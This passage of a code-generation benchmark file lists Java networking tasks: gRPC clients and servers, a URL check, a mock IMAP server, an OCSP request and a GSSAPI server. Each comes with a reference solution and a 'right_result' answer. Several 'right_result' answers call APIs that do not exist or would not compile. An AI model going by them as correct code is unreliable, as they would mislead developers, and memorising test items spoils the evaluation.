RuntimeException(\"Failed to list nodes: \" + e.getMessage(), e);\n        }\n    }\n\n    public Optional<AssetIssueList> getAssetIssueByAccount(byte[] address) {\n        GrpcAPI.BytesMessage request = GrpcAPI.BytesMessage.newBuilder()\n                .setValue(ByteString.copyFrom(address))\n                .build();\n        try {\n            GrpcAPI.AssetIssueList response = walletBlockingStub.getAssetIssueByAccount(request);\n            return Optional.ofNullable(response);\n        } catch (StatusRuntimeException e) {\n            throw new RuntimeException(\"Failed to get asset issues by account: \" + e.getMessage(), e);\n        }\n    }\n\n    public AssetIssueContract getAssetIssueByName(String assetName) {\n        GrpcAPI.StringMessage request = GrpcAPI.StringMessage.newBuilder()\n                .setValue(assetName)\n                .build();\n        try {\n            GrpcAPI.AssetIssueContract response = walletBlockingStub.getAssetIssueByName(request);\n            return response;\n        } catch (StatusRuntimeException e) {\n            throw new RuntimeException(\"Failed to get asset by name: \" + e.getMessage(), e);\n        }\n    }\n\n    public Optional<AssetIssueList> getAssetIssueListByName(String assetName) {\n        GrpcAPI.StringMessage request = GrpcAPI.StringMessage.newBuilder()\n                .setValue(assetName)\n                .build();\n        try {\n            GrpcAPI.AssetIssueList response = walletBlockingStub.getAssetIssueListByName(request);\n            return Optional.ofNullable(response);\n        } catch (StatusRuntimeException e) {\n            throw new RuntimeException(\"Failed to get asset list by name: \" + e.getMessage(), e);\n        }\n    }\n\n    public AssetIssueContract getAssetIssueById(String assetId) {\n        GrpcAPI.StringMessage request = GrpcAPI.StringMessage.newBuilder()\n                .setValue(assetId)\n                .build();\n        try {\n            GrpcAPI.AssetIssueContract response = walletBlockingStub.getAssetIssueById(request);\n            return response;\n        } catch (StatusRuntimeException e) {\n            throw new RuntimeException(\"Failed to get asset by ID: \" + e.getMessage(), e);\n        }\n    }\n}"
  },
  {
    "Task_id": 504,
    "Instruction": "Task Description: Implement a function to test the gRPC Server Reflection service by establishing a connection to a gRPC server, sending a reflection request, and processing the response.\n\nFunction Description: The function connects to a gRPC server running on localhost at port 9090 using plaintext communication. It creates an asynchronous stub for the Server Reflection service, sends a request to list all available services, and processes the response. The function ensures proper cleanup by shutting down the channel after completion.\n\nInput: None (The target server address is hardcoded as \"localhost:9090\")\n\nOutput: None (The function processes the reflection response internally via the checkResult method, which is not shown in the reference code)",
    "Canonical_solution": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.reflection.v1alpha.ServerReflectionGrpc;\nimport io.grpc.reflection.v1alpha.ServerReflectionGrpc.ServerReflectionStub;\nimport io.grpc.reflection.v1alpha.ServerReflectionRequest;\nimport io.grpc.reflection.v1alpha.ServerReflectionResponse;\nimport io.grpc.stub.StreamObserver;\n\nvoid testReflectionService() {\n    final ManagedChannel channel = ManagedChannelBuilder.forTarget(\"localhost:9090\").usePlaintext().build();\n    try {\n        final ServerReflectionStub stub = ServerReflectionGrpc.newStub(channel);\n\n        final AwaitableStreamObserver<ServerReflectionResponse> resultObserver = new AwaitableStreamObserver<>();\n        final StreamObserver<ServerReflectionRequest> requestObserver = stub.serverReflectionInfo(resultObserver);\n        requestObserver.onNext(ServerReflectionRequest.newBuilder()\n                .setListServices(\"\")\n                .build());\n        requestObserver.onCompleted();\n        checkResult(resultObserver);\n    } finally {\n        channel.shutdown();\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 23,
    "right_result": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.StatusRuntimeException;\nimport io.grpc.stub.StreamObserver;\nimport com.google.protobuf.Empty;\nimport io.grpc.reflection.v1alpha.ServerReflectionRequest;\nimport io.grpc.reflection.v1alpha.ServerReflectionResponse;\nimport io.grpc.reflection.v1alpha.ServerReflectionStreamingResponseHandler;\n\npublic class GrpcServerReflectionTest {\n    public static void testServerReflection() {\n        ManagedChannel channel = ManagedChannelBuilder.forAddress(\"localhost\", 9090)\n                .usePlaintext()\n                .build();\n\n        try {\n            ServerReflectionStreamingResponseHandler handler = new ServerReflectionStreamingResponseHandler(\n                    ServerReflectionRequest.newBuilder().setListServicesRequest(Empty.getDefaultInstance()).build(),\n                    new StreamObserver<ServerReflectionResponse>() {\n                        @Override\n                        public void onNext(ServerReflectionResponse response) {\n                            // Process the reflection response here\n                            System.out.println(\"Received reflection response: \" + response);\n                        }\n\n                        @Override\n                        public void onError(Throwable t) {\n                            System.err.println(\"Error during reflection: \" + t.getMessage());\n                        }\n\n                        @Override\n                        public void onCompleted() {\n                            System.out.println(\"Reflection completed.\");\n                        }\n                    });\n\n            channel.<ServerReflectionResponse>streamingCall(\n                    io.grpc.MethodDescriptor.<ServerReflectionRequest, ServerReflectionResponse>newStreamedMethod(\n                            \"ServerReflection\",\n                            io.grpc.MethodDescriptor.Marshaller<ServerReflectionRequest>::of,\n                            io.grpc.MethodDescriptor.Marshaller<ServerReflectionResponse>::of)\n                            .build(),\n                    ServerReflectionRequest.newBuilder().setListServicesRequest(Empty.getDefaultInstance()).build(),\n                    handler);\n\n            // Wait for the stream to complete (non-blocking in async context)\n            Thread.sleep(1000);\n        } catch (StatusRuntimeException | InterruptedException e) {\n            System.err.println(\"Exception during reflection: \" + e.getMessage());\n        } finally {\n            channel.shutdown();\n        }\n    }\n}"
  },
  {
    "Task_id": 505,
    "Instruction": "Task Description: Create a Java class that implements a gRPC client for interacting with multiple TRON blockchain nodes (full node, solidity node, and PBFT node) to retrieve block information.\n\nClass Description: The GrpcClient class provides functionality to connect to different types of TRON blockchain nodes using gRPC protocol and retrieve block data from them. It manages multiple channel connections and provides blocking stub interfaces for synchronous calls.\n\nAttributes:\n- channelFull: [ManagedChannel] - Channel for connection to the full node\n- channelSolidity: [ManagedChannel] - Channel for connection to the solidity node\n- channelpBFT: [ManagedChannel] - Channel for connection to the PBFT node\n- blockingStubFull: [WalletGrpc.WalletBlockingStub] - Blocking stub for full node operations\n- blockingStubSolidity: [WalletSolidityGrpc.WalletSolidityBlockingStub] - Blocking stub for solidity node operations\n- blockingStubpBFT: [WalletSolidityGrpc.WalletSolidityBlockingStub] - Blocking stub for PBFT node operations\n\nMethods:\n- init: [void]([String fullnode, String solidityNode, String pBFTNode]) -> [void] - Initializes connections to all three node types by creating channels and stubs\n- getBlockFromFullNode: [GrpcAPI.Block]([long blockNum]) -> [GrpcAPI.Block] - Retrieves a block from the full node by block number\n- getBlockFromSolidityNode: [GrpcAPI.Block]([long blockNum]) -> [GrpcAPI.Block] - Retrieves a block from the solidity node by block number\n- getBlockFromPBFTNode: [GrpcAPI.Block]([long blockNum]) -> [GrpcAPI.Block] - Retrieves a block from the PBFT node by block number\n- shutdown: [void]([]) -> [void] - Gracefully shuts down all channel connections with a 5-second timeout",
    "Canonical_solution": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.StatusRuntimeException;\nimport java.util.concurrent.TimeUnit;\nimport org.tron.api.GrpcAPI;\nimport org.tron.api.WalletGrpc;\nimport org.tron.api.WalletSolidityGrpc;\n\npublic class GrpcClient {\n\n    private ManagedChannel channelFull;\n    private ManagedChannel channelSolidity;\n    private ManagedChannel channelpBFT;\n    private WalletGrpc.WalletBlockingStub blockingStubFull;\n    private WalletSolidityGrpc.WalletSolidityBlockingStub blockingStubSolidity;\n    private WalletSolidityGrpc.WalletSolidityBlockingStub blockingStubpBFT;\n\n    public void init(String fullnode, String solidityNode, String pBFTNode) {\n        channelFull = ManagedChannelBuilder.forTarget(fullnode)\n                .usePlaintext()\n                .build();\n        channelSolidity = ManagedChannelBuilder.forTarget(solidityNode)\n                .usePlaintext()\n                .build();\n        channelpBFT = ManagedChannelBuilder.forTarget(pBFTNode)\n                .usePlaintext()\n                .build();\n        blockingStubFull = WalletGrpc.newBlockingStub(channelFull);\n        blockingStubSolidity = WalletSolidityGrpc.newBlockingStub(channelSolidity);\n        blockingStubpBFT = WalletSolidityGrpc.newBlockingStub(channelpBFT);\n    }\n\n    public GrpcAPI.Block getBlockFromFullNode(long blockNum) throws StatusRuntimeException {\n        GrpcAPI.NumberMessage message = GrpcAPI.NumberMessage.newBuilder().setNum(blockNum).build();\n        return blockingStubFull.getBlockByNum(message);\n    }\n\n    public GrpcAPI.Block getBlockFromSolidityNode(long blockNum) throws StatusRuntimeException {\n        GrpcAPI.NumberMessage message = GrpcAPI.NumberMessage.newBuilder().setNum(blockNum).build();\n        return blockingStubSolidity.getBlockByNum(message);\n    }\n\n    public GrpcAPI.Block getBlockFromPBFTNode(long blockNum) throws StatusRuntimeException {\n        GrpcAPI.NumberMessage message = GrpcAPI.NumberMessage.newBuilder().setNum(blockNum).build();\n        return blockingStubpBFT.getBlockByNum(message);\n    }\n\n    public void shutdown() throws InterruptedException {\n        if (channelFull != null) {\n            channelFull.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n        }\n        if (channelSolidity != null) {\n            channelSolidity.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n        }\n        if (channelpBFT != null) {\n            channelpBFT.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "right_result": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.StatusRuntimeException;\nimport com.google.protobuf.Empty;\nimport GrpcAPI.Block;\nimport WalletGrpc.WalletBlockingStub;\nimport WalletSolidityGrpc.WalletSolidityBlockingStub;\n\npublic class GrpcClient {\n    private ManagedChannel channelFull;\n    private ManagedChannel channelSolidity;\n    private ManagedChannel channelpBFT;\n    private WalletBlockingStub blockingStubFull;\n    private WalletSolidityBlockingStub blockingStubSolidity;\n    private WalletSolidityBlockingStub blockingStubpBFT;\n\n    public void init(String fullnode, String solidityNode, String pBFTNode) {\n        channelFull = ManagedChannelBuilder.forTarget(fullnode).usePlaintext().build();\n        blockingStubFull = WalletGrpc.newBlockingStub(channelFull);\n\n        channelSolidity = ManagedChannelBuilder.forTarget(solidityNode).usePlaintext().build();\n        blockingStubSolidity = WalletSolidityGrpc.newBlockingStub(channelSolidity);\n\n        channelpBFT = ManagedChannelBuilder.forTarget(pBFTNode).usePlaintext().build();\n        blockingStubpBFT = WalletSolidityGrpc.newBlockingStub(channelpBFT);\n    }\n\n    public Block getBlockFromFullNode(long blockNum) {\n        try {\n            return blockingStubFull.getBlockByNumber(Empty.newBuilder().build(), blockNum);\n        } catch (StatusRuntimeException e) {\n            System.err.println(\"Error retrieving block from full node: \" + e.getStatus().getDescription());\n            return null;\n        }\n    }\n\n    public Block getBlockFromSolidityNode(long blockNum) {\n        try {\n            return blockingStubSolidity.getBlockByNumber(Empty.newBuilder().build(), blockNum);\n        } catch (StatusRuntimeException e) {\n            System.err.println(\"Error retrieving block from solidity node: \" + e.getStatus().getDescription());\n            return null;\n        }\n    }\n\n    public Block getBlockFromPBFTNode(long blockNum) {\n        try {\n            return blockingStubpBFT.getBlockByNumber(Empty.newBuilder().build(), blockNum);\n        } catch (StatusRuntimeException e) {\n            System.err.println(\"Error retrieving block from PBFT node: \" + e.getStatus().getDescription());\n            return null;\n        }\n    }\n\n    public void shutdown() {\n        if (channelFull != null) {\n            channelFull.shutdown().awaitTermination(5, java.util.concurrent.TimeUnit.SECONDS);\n        }\n        if (channelSolidity != null) {\n            channelSolidity.shutdown().awaitTermination(5, java.util.concurrent.TimeUnit.SECONDS);\n        }\n        if (channelpBFT != null) {\n            channelpBFT.shutdown().awaitTermination(5, java.util.concurrent.TimeUnit.SECONDS);\n        }\n    }\n}"
  },
  {
    "Task_id": 51,
    "Instruction": "Task Description: Create a function to test if a given URL is reachable by making an HTTP GET request and verifying the response code.\n\nFunction Description: The function attempts to connect to a specified URL using an HTTP GET request. It checks if the response code is HTTP_OK (200) to determine if the URL is reachable. The connection is properly closed after the check.\n\nInput: \n- strUrl: String - The URL to be tested for reachability\n\nOutput: \n- None (The function throws an exception if the URL is unreachable or if the response code is not HTTP_OK)",
    "Canonical_solution": "import java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic void testUrlReachable(String strUtl) throws Exception {\n    URL url = new URL(strUtl);\n    HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n    conn.setRequestMethod(\"GET\");\n    conn.connect();\n    int rc = conn.getResponseCode();\n    assertEquals(HttpURLConnection.HTTP_OK, rc);\n    conn.disconnect();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "right_result": "import java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class UrlReachabilityChecker {\n    public static void checkUrlReachability(String strUrl) throws IOException {\n        URL url = new URL(strUrl);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n        int responseCode = connection.getResponseCode();\n        if (responseCode != HttpURLConnection.HTTP_OK) {\n            throw new IOException(\"URL is unreachable or returned HTTP error code: \" + responseCode);\n        }\n        connection.disconnect();\n    }\n}"
  },
  {
    "Task_id": 511,
    "Instruction": "Task Description: Create a Java class that implements a gRPC server launcher for Spring Boot applications, capable of registering multiple gRPC services and managing server lifecycle.\n\nClass Description: The GrpcLauncher class is responsible for starting and managing a gRPC server in a Spring Boot application. It automatically discovers gRPC service beans, configures server parameters, and handles graceful shutdown. The class uses Lombok for logging and Spring's dependency injection.\n\nAttributes:\n- server: [Server] - The gRPC server instance\n- grpcServerPort: [Integer] - The port number for the gRPC server, injected from application properties\n- DEFAULT_MAX_MESSAGE_SIZE: [int] - Constant defining the maximum message size (10MB)\n\nMethods:\n- grpcStart: [grpcStart](Map<String, Object> grpcServiceBeanMap) -> void - Initializes and starts the gRPC server, registering all provided gRPC service beans. Handles server lifecycle and shutdown hooks.\n- grpcStop: [grpcStop]() -> void - Shuts down the gRPC server gracefully when called, typically during application termination.",
    "Canonical_solution": "import io.grpc.BindableService;\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport java.io.IOException;\nimport java.util.Map;\n\n@Slf4j\n@Component(\"grpcLauncher\")\npublic class GrpcLauncher {\n\n    public static final int DEFAULT_MAX_MESSAGE_SIZE = 10 * 1024 * 1024;\n\n    private Server server;\n\n    @Value(\"${server.grpc.port}\")\n    private Integer grpcServerPort;\n\n    public void grpcStart(Map<String, Object> grpcServiceBeanMap) {\n        try {\n            ServerBuilder serverBuilder = ServerBuilder.forPort(grpcServerPort);\n            for (Object bean : grpcServiceBeanMap.values()){\n                serverBuilder.addService((BindableService) bean);\n                log.info(\"{} is register in Spring Boot\", bean.getClass().getSimpleName());\n            }\n            server = serverBuilder\n                .maxInboundMessageSize(DEFAULT_MAX_MESSAGE_SIZE)\n                .maxInboundMetadataSize(DEFAULT_MAX_MESSAGE_SIZE)\n                .build().start();\n            log.info(\"grpc server is started at {}\", grpcServerPort);\n            server.awaitTermination();\n            Runtime.getRuntime().addShutdownHook(new Thread(this::grpcStop));\n        } catch (IOException | InterruptedException e){\n            e.printStackTrace();\n        }\n    }\n\n    private void grpcStop(){\n        if (server != null){\n            server.shutdownNow();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "right_result": "import io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\nimport java.io.IOException;\nimport java.util.Map;\nimport lombok.extern.slf4j.Slf4j;\n\n@Component\n@Slf4j\npublic class GrpcLauncher {\n    private Server server;\n    @Value(\"${grpc.server.port}\")\n    private int grpcServerPort;\n    private static final int DEFAULT_MAX_MESSAGE_SIZE = 10 * 1024 * 1024;\n\n    public void grpcStart(Map<String, Object> grpcServiceBeanMap) {\n        try {\n            server = ServerBuilder.forPort(grpcServerPort)\n                    .addExecutor(\"grpc-io\", java.util.concurrent.Executors.newCachedThreadPool())\n                    .maxMessageSize(DEFAULT_MAX_MESSAGE_SIZE)\n                    .fallbackHandlerProvider(io.grpc.netty.NettyServerBuilder.FALLBACK_HANDLER_PROVIDER)\n                    .build();\n\n            for (Map.Entry<String, Object> entry : grpcServiceBeanMap.entrySet()) {\n                server.addService((io.grpc.BindableService) entry.getValue());\n            }\n\n            server.start();\n            log.info(\"gRPC server started on port {}\", grpcServerPort);\n            Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n                try {\n                    grpcStop();\n                } catch (Exception e) {\n                    log.error(\"Error during graceful shutdown\", e);\n                }\n            }));\n        } catch (IOException e) {\n            log.error(\"Failed to start gRPC server\", e);\n        }\n    }\n\n    public void grpcStop() throws IOException {\n        if (server != null) {\n            server.shutdown();\n            server.awaitTermination();\n            log.info(\"gRPC server has been shut down\");\n        }\n    }\n}"
  },
  {
    "Task_id": 519,
    "Instruction": "Task Description: Create a mock IMAP server implementation in Java that simulates IMAP server behavior for testing purposes, handling client connections and interactions through TCP sockets.\n\nClass Description: MockImapServer is a test utility class that simulates an IMAP server by listening on a local port, accepting client connections, and processing predefined interactions. It manages server lifecycle and provides synchronization mechanisms for test coordination.\n\nAttributes:\n- interactions: Deque<ImapInteraction> - A thread-safe queue of predefined IMAP interactions to simulate\n- waitForConnectionClosed: CountDownLatch - Synchronization primitive for waiting until client connection closes\n- waitForAllExpectedCommands: CountDownLatch - Synchronization primitive for waiting until all expected commands are processed\n- mockServerThread: MockServerThread - The thread running the server operations\n- host: String - The host address the server is bound to\n- port: int - The port number the server is listening on\n\nMethods:\n- start() -> void - Starts the mock server by creating a ServerSocket and launching the server thread. Binds to an available port on localhost.\n- shutdown() -> void - Stops the server thread and cleans up resources, with a 500ms timeout for graceful shutdown.\n- MockServerThread(ServerSocket, Deque<ImapInteraction>, CountDownLatch, CountDownLatch) -> void - Constructor for the server thread implementation\n- run() -> void - Main server thread logic that accepts connections, processes interactions, and handles cleanup\n- handleInteractions() -> void - Processes the next interaction from the queue (internal method)\n- readAdditionalCommands() -> void - Reads additional unexpected commands from client (internal method)\n- shouldStop() -> void - Signals the server thread to stop and closes client socket",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Deque;\nimport java.util.concurrent.ConcurrentLinkedDeque;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MockImapServer {\n    private final Deque<ImapInteraction> interactions = new ConcurrentLinkedDeque<>();\n    private final CountDownLatch waitForConnectionClosed = new CountDownLatch(1);\n    private final CountDownLatch waitForAllExpectedCommands = new CountDownLatch(1);\n    private MockServerThread mockServerThread;\n    private String host;\n    private int port;\n\n    public void start() throws IOException {\n        InetAddress localAddress = InetAddress.getByName(null);\n        ServerSocket serverSocket = new ServerSocket(0, 1, localAddress);\n        host = ((java.net.InetSocketAddress) serverSocket.getLocalSocketAddress()).getHostString();\n        port = serverSocket.getLocalPort();\n\n        mockServerThread = new MockServerThread(serverSocket, interactions, waitForConnectionClosed,\n                waitForAllExpectedCommands);\n        mockServerThread.start();\n    }\n\n    public void shutdown() {\n        mockServerThread.shouldStop();\n        try {\n            mockServerThread.join(500L);\n        } catch (InterruptedException ignored) {\n        }\n    }\n\n    private static class MockServerThread extends Thread {\n        private final ServerSocket serverSocket;\n        private final Deque<ImapInteraction> interactions;\n        private final CountDownLatch waitForConnectionClosed;\n        private final CountDownLatch waitForAllExpectedCommands;\n        private volatile boolean shouldStop = false;\n        private volatile Socket clientSocket;\n\n        public MockServerThread(ServerSocket serverSocket, Deque<ImapInteraction> interactions,\n                              CountDownLatch waitForConnectionClosed, CountDownLatch waitForAllExpectedCommands) {\n            this.serverSocket = serverSocket;\n            this.interactions = interactions;\n            this.waitForConnectionClosed = waitForConnectionClosed;\n            this.waitForAllExpectedCommands = waitForAllExpectedCommands;\n        }\n\n        @Override\n        public void run() {\n            try {\n                clientSocket = serverSocket.accept();\n                serverSocket.close();\n\n                while (!shouldStop && !interactions.isEmpty()) {\n                    handleInteractions();\n                }\n\n                waitForAllExpectedCommands.countDown();\n\n                while (!shouldStop) {\n                    readAdditionalCommands();\n                }\n\n                waitForConnectionClosed.countDown();\n            } catch (IOException e) {\n                if (!shouldStop) {\n                    e.printStackTrace();\n                }\n            } finally {\n                try {\n                    if (clientSocket != null) {\n                        clientSocket.close();\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n\n        private void handleInteractions() throws IOException {\n            ImapInteraction interaction = interactions.pop();\n            if (interaction instanceof CloseConnection) {\n                clientSocket.close();\n            }\n        }\n\n        private void readAdditionalCommands() throws IOException {\n            String command = new java.io.BufferedReader(\n                    new java.io.InputStreamReader(clientSocket.getInputStream())).readLine();\n            if (command == null) {\n                throw new java.io.EOFException();\n            }\n        }\n\n        public void shouldStop() {\n            shouldStop = true;\n            try {\n                if (clientSocket != null) {\n                    clientSocket.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private interface ImapInteraction {}\n    private static class CloseConnection implements ImapInteraction {}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "import java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Deque;\nimport java.util.LinkedList;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MockImapServer {\n    private final Deque<ImapInteraction> interactions;\n    private final CountDownLatch waitForConnectionClosed;\n    private final CountDownLatch waitForAllExpectedCommands;\n    private final MockServerThread mockServerThread;\n    private final String host;\n    private final int port;\n    private ServerSocket serverSocket;\n\n    public MockImapServer() {\n        this.interactions = new LinkedList<>();\n        this.waitForConnectionClosed = new CountDownLatch(1);\n        this.waitForAllExpectedCommands = new CountDownLatch(1);\n        this.mockServerThread = null;\n        this.host = \"localhost\";\n        this.port = 0;\n    }\n\n    public void start() {\n        try {\n            serverSocket = new ServerSocket();\n            serverSocket.bind(new InetSocketAddress(host, port));\n            this.port = serverSocket.getLocalPort();\n            mockServerThread = new MockServerThread(serverSocket, interactions, waitForConnectionClosed, waitForAllExpectedCommands);\n            mockServerThread.start();\n        } catch (IOException e) {\n            throw new RuntimeException(\"Failed to start mock IMAP server\", e);\n        }\n    }\n\n    public void shutdown() {\n        if (mockServerThread != null) {\n            mockServerThread.shouldStop();\n            try {\n                mockServerThread.join(500);\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        }\n        if (serverSocket != null) {\n            try {\n                serverSocket.close();\n            } catch (IOException e) {\n                throw new RuntimeException(\"Failed to close server socket\", e);\n            }\n        }\n    }\n\n    static class MockServerThread implements Runnable {\n        private final ServerSocket serverSocket;\n        private final Deque<ImapInteraction> interactions;\n        private final CountDownLatch waitForConnectionClosed;\n        private final CountDownLatch waitForAllExpectedCommands;\n        private volatile boolean shouldStop = false;\n        private Socket clientSocket;\n        private BufferedReader reader;\n        private BufferedWriter writer;\n\n        public MockServerThread(ServerSocket serverSocket, Deque<ImapInteraction> interactions, CountDownLatch waitForConnectionClosed, CountDownLatch waitForAllExpectedCommands) {\n            this.serverSocket = serverSocket;\n            this.interactions = interactions;\n            this.waitForConnectionClosed = waitForConnectionClosed;\n            this.waitForAllExpectedCommands = waitForAllExpectedCommands;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (!shouldStop) {\n                    clientSocket = serverSocket.accept();\n                    reader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n                    writer = new BufferedWriter(new OutputStreamWriter(clientSocket.getOutputStream()));\n                    handleClientConnection();\n                }\n            } catch (IOException e) {\n                throw new RuntimeException(\"Error handling client connection\", e);\n            } finally {\n                try {\n                    if (clientSocket != null) {\n                        clientSocket.close();\n                    }\n                } catch (IOException e) {\n                    throw new RuntimeException(\"Error closing client socket\", e);\n                }\n            }\n        }\n\n        private void handleClientConnection() throws IOException {\n            writer.write(\"OK CAPABILITY\\r\\n\");\n            writer.flush();\n\n            while (!shouldStop) {\n                String line = reader.readLine();\n                if (line == null) {\n                    break;\n                }\n                if (line.trim().isEmpty()) {\n                    continue;\n                }\n\n                if (line.startsWith(\"LOGOUT\")) {\n                    waitForConnectionClosed.countDown();\n                    shouldStop = true;\n                    break;\n                }\n\n                ImapInteraction interaction = interactions.poll();\n                if (interaction == null) {\n                    readAdditionalCommands();\n                    break;\n                }\n\n                if (interaction.matches(line)) {\n                    writer.write(interaction.getResponse());\n                    writer.flush();\n                    waitForAllExpectedCommands.countDown();\n                } else {\n                    readAdditionalCommands();\n                    break;\n                }\n            }\n        }\n\n        private void readAdditionalCommands() throws IOException {\n            while (!shouldStop) {\n                String line = reader.readLine();\n                if (line == null || line.trim().isEmpty()) {\n                    break;\n                }\n            }\n        }\n\n        public void shouldStop() {\n            shouldStop = true;\n        }\n    }\n}"
  },
  {
    "Task_id": 52,
    "Instruction": "Task Description: Create a function that sends an OCSP (Online Certificate Status Protocol) request to a specified URL and processes the response.\n\nFunction Description: The function establishes an HTTP connection to the provided URL, sends an OCSP request, reads the response, and constructs an OCSPResp object from the received data. It handles the connection lifecycle and ensures proper resource cleanup.\n\nInput:\n- url: [String] - The URL to which the OCSP request will be sent\n- ocspReq: [OCSPReq] - The OCSP request object containing the encoded request data\n\nOutput:\n- [OCSPResp] - The OCSP response object constructed from the server's response data\n- Throws [IOException] - If any I/O error occurs during the request/response process",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport org.apache.commons.io.IOUtils;\n\nprivate OCSPResp requestOCSPResponse(String url, OCSPReq ocspReq) throws IOException {\n    byte[] ocspReqData = ocspReq.getEncoded();\n\n    HttpURLConnection con = (HttpURLConnection) new URL(url).openConnection();\n    try {\n        con.setRequestProperty(\"Content-Type\", \"application/ocsp-request\");\n        con.setRequestProperty(\"Accept\", \"application/ocsp-response\");\n        con.setDoInput(true);\n        con.setDoOutput(true);\n        con.setUseCaches(false);\n        try (OutputStream out = con.getOutputStream()) {\n            IOUtils.write(ocspReqData, out);\n            out.flush();\n        }\n        byte[] responseBytes = IOUtils.toByteArray(con.getInputStream());\n        OCSPResp ocspResp = new OCSPResp(responseBytes);\n        return ocspResp;\n    } finally {\n        if (con != null) {\n            con.disconnect();\n        }\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "right_result": "import java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.security.cert.CertificateException;\nimport java.security.cert.CertPath;\nimport java.security.cert.CertPathValidator;\nimport java.security.cert.CertStore;\nimport java.security.cert.CertificateFactory;\nimport java.security.cert.PKIXParameters;\nimport java.security.cert.TrustAnchor;\nimport java.security.cert.X509Certificate;\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.List;\n\nimport org.bouncycastle.asn1.ocsp.OCSPResp;\nimport org.bouncycastle.asn1.ocsp.OCSPObjectIdentifiers;\nimport org.bouncycastle.asn1.x509.CertificateList;\nimport org.bouncycastle.cert.ocsp.OCSPRespGenerator;\nimport org.bouncycastle.cert.ocsp.OCSPUtil;\nimport org.bouncycastle.cert.ocsp.ResponseBytes;\nimport org.bouncycastle.cert.ocsp.SignerInfo;\nimport org.bouncycastle.operator.ContentSigner;\nimport org.bouncycastle.operator.jcajce.JcaContentSignerBuilder;\n\npublic class OCSPClient {\n    public static OCSPResp sendOCSPRequest(String url, OCSPReq ocspReq) throws IOException {\n        URL requestUrl = new URL(url);\n        HttpURLConnection connection = (HttpURLConnection) requestUrl.openConnection();\n        connection.setRequestMethod(\"POST\");\n        connection.setDoOutput(true);\n        connection.setRequestProperty(\"Content-Type\", \"application/ocsp-request\");\n\n        try (InputStream requestStream = ocspReq.getEncoded()) {\n            connection.getOutputStream().write(requestStream.readAllBytes());\n        }\n\n        int responseCode = connection.getResponseCode();\n        if (responseCode != HttpURLConnection.HTTP_OK) {\n            throw new IOException(\"Server returned HTTP code: \" + responseCode);\n        }\n\n        try (InputStream responseStream = connection.getInputStream()) {\n            byte[] responseData = responseStream.readAllBytes();\n            return new OCSPResp(responseData);\n        } finally {\n            connection.disconnect();\n        }\n    }\n}"
  },
  {
    "Task_id": 528,
    "Instruction": "Task Description: Implement a Java class that creates a TCP server using ServerSocket with GSSAPI (Generic Security Services API) authentication for secure client-server communication.\n\nClass Description: The GSSServer class establishes a secure TCP server that listens for incoming client connections, performs GSSAPI authentication, and enables secure message exchange between server and client.\n\nAttributes:\n- s: [ServerSocket] - The server socket that listens for incoming client connections on a specified port.\n\nMethods:\n- main([String[] args]) -> [void] - Entry point of the server application. Parses command line arguments (service name, port, and mechanism OID), creates server credentials, and starts listening for client connections.\n  Input: Command line arguments (optional: -port [portNumber], -mech [mechanismOID], serviceName)\n  Output: None (runs indefinitely until terminated)\n\n- processClient([GSSCredential server], [Socket client]) -> [void] - Handles an individual client connection by performing GSSAPI authentication and establishing a secure context.\n  Input: \n    - server: [GSSCredential] - Server's credentials for authentication\n    - client: [Socket] - Client connection socket\n  Output: None (closes connection when done)\n\n- exchangeWithPeer([GSSContext aCtxt], [DataInputStream dis], [DataOutputStream dos]) -> [void] - Performs secure message exchange with an authenticated client.\n  Input:\n    - aCtxt: [GSSContext] - Established security context\n    - dis: [DataInputStream] - Input stream from client\n    - dos: [DataOutputStream] - Output stream to client\n  Output: None (sends response and closes connection)\n\n- usage() -> [void] - Prints usage instructions for the server application.\n  Input: None\n  Output: None (prints to console)\n\n- print([String msg]) -> [void] - Helper method to print messages to console.\n  Input: msg [String] - Message to print\n  Output: None (prints to console)\n\n- exit([int status]) -> [void] - Cleanly shuts down the server by closing the server socket and exiting the application.\n  Input: status [int] - 